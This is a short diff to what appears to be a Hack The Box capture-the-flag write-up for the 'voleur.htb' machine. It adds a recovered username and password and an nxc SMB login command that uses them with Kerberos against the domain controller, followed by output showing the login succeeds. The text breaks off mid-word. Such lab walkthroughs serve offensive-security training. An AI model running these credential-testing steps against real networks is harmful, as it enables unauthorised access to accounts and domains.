@@ -441,6 +441,17 @@ Unknown     :
 Username    : jeremy.combs
 Unknown     : qT3V9pLXyN7W4m
 ```
-Found more cred
+Found more credentials
+
+```python
+jeremy.combs:qT3V9pLXyN7W4m
+```
+
+```python
+faketime -f +8h nxc smb dc.voleur.htb -u 'jeremy.combs' -p 'qT3V9pLXyN7W4m' -k
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
+```
+This user is now cpo
 
 
